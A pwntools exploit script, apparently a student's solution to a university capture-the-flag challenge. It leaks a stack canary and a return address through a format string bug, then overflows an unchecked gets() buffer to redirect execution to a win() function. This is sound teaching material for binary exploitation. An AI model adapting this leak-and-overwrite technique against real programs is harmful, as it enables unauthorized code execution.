from pwn import *

elf = ELF('./watchdogs')

p = process('./watchdogs') # test locally
#p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5003)

# Leak 11th stack pointer value(canary) and leaked address(13th pointer) using format string vulnerability
p.sendlineafter(b'Please enter your username:\n', b"%11$llx %13$llx")
p.recvuntil(b"\n\nWelcome, ")
leak_line = p.recvline()                  # Read line containing 2 leaks(canary value & leaked address)
leak_parts = leak_line.split()            # Split into list of byte strings
canary_str = leak_parts[0]                # First part is the canary (as bytes)
retaddr_str = leak_parts[1]               # Second part is the return address to menu() (as bytes)
canary = int(canary_str, 16)              # Convert canary to integer
leaked_ret = int(retaddr_str, 16)         # Convert return address to integer

# Calculate base address of menu() using leak - offset
offset_of_leaked_from_start_of_menu = 37
start_of_menu = leaked_ret - offset_of_leaked_from_start_of_menu
win = start_of_menu - 596 # calculate addr of win from start of menu

# Buffer overflow payload
payload = b'A' * 56; # buf size is 0x30 = 48 bytes, plus padding to reach canary
payload += p64(canary) # stack canary
payload += b'A' * 8 # saved RBP
payload += p64(win) # overwritten return address -> win()

p.sendlineafter(b"Option: ", b"2") #access_mainframe has no input validation for gets(buf)
p.sendline(payload)
p.interactive()
